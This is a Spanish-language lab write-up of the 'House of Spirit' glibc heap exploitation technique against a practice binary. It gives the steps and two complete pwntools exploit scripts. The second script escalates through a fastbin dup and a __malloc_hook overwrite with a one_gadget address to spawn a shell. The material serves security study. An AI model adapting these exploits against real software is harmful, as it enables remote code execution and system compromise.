# House Of Spirit

En esta ocasion se almacena un array de objetos llamado `m_array` en el stack con dos campos: `name` y `ptr`. Por un desbordamiento al leer el nombre se puede sobreescribir el campo `ptr` que es la direccion de memoria que se le pasa a `free` al liberar un chunk para un indice especifico.

Pasos:
1. Crear un chunk falso en la estructura `user`, donde `user.age` sera el campo `size`=0x70 para que nextchunk sea `user.username`.
2. Crear un nextchunk falso para A en `user.username` con  0x10 < `size` < 0x1000 para pasar las verificaciones de sanidad.
3. Reservar un chunk A de tamaño arbitrario y sobreescribir `m_array[0].ptr` con la direccion de nuestro chunk falso en `user`.
4. Liberar el chunk A, provocando que el chunk falso en `user` vaya a una fastbin.
5. Reservar un chunk B de tamaño 0x60 para obtener el chunk en la fastbin.
6. Sobreescribir `target`.

## Exploit
``` py
from pwn import *
r = process("./house_of_spirit")
libc = ELF("../.glibc/glibc_2.30_no-tcache/libc.so.6",checksec=False)

index = 0

def malloc(size,data,name):
    global index
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b"size:",str(size).encode())
    r.sendlineafter(b"data:",data)
    r.sendlineafter(b"name:",name)
    index += 1
    return index - 1

def free(idx):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b"index:",str(idx).encode())

r.recvuntil(b"@ ")
libc.address = int(r.recv(14).strip(),16) -  0x6faf0

r.recvuntil(b"@ ")
heap = int(r.recv(10).strip(),16)

# Fake chunk->size
r.sendlineafter(b"age:",str(0x70).encode())

# Fake nextchunk->prevsize and nextchunk->size
r.sendlineafter(b"username:",p64(0) + p64(0x1234))

# chunksize_nomask (chunk_at_offset (p, size)) > CHUNK_HDR_SZ
# chunksize (chunk_at_offset (p, size)) < av->system_mem

# Create chunk A with arbitrary size to overwrite m_array.ptr with m_array.name
a = malloc(0x30,b"",p64(0) + p64(0x602020))

# m_array[0].ptr = 0x602010 (user, AKA fake chunk)
free(a)

# Alloc chunk B in the .bss section and overwrite "target"
b = malloc(0x60,b"A"*0x40 + b"_s1s1fo_",b"osaka")

r.sendlineafter(b">",b"3")
r.interactive()
```

## RCE
No me quede contento con esa direccion de libc sin usar :)

``` py
from pwn import *
r = process("./house_of_spirit")
libc = ELF("../.glibc/glibc_2.30_no-tcache/libc.so.6",checksec=False)

index = 0

def malloc(size,data,name):
    global index
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b"size:",str(size).encode())
    r.sendlineafter(b"data:",data)
    r.sendlineafter(b"name:",name)
    index += 1
    return index - 1

def free(idx):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b"index:",str(idx).encode())

r.recvuntil(b"@ ")
libc.address = int(r.recv(14).strip(),16) -  0x6faf0

r.recvuntil(b"@ ")
heap = int(r.recv(10).strip(),16)

r.sendlineafter(b"age:",b"")
r.sendlineafter(b"username:",b"")

# House of Spirit => fastbin dup
a = malloc(0x60,b"",b"a")
b = malloc(0x60,b"",b"b")
c = malloc(0x60,b"",b"c"*8 + p64(heap + 0x10))

free(a)
free(b)
free(c)

'''

 originally you want __malloc_hook - 0x10 but in order to bypass 
  fastbin_index (chunksize (victim)) != idx
 (__malloc_hook - 0x23)->size = 0x7f (valid size in the fast chunk size range)

'''

a = malloc(0x60,p64(libc.symbols['__malloc_hook'] - 0x23),b"a")

malloc(0x60,b"",b"b")
malloc(0x60,b"",b"a")

one_gadget = libc.address + 0xe1fa1 

# Overwrite __malloc_hook
mh = malloc(0x60,b"A" * 0x13 + p64(one_gadget),b"")

# Call system("/bin/sh")
r.sendlineafter(b">",b"1")
r.sendlineafter(b"size:",b"32")

r.interactive()
```

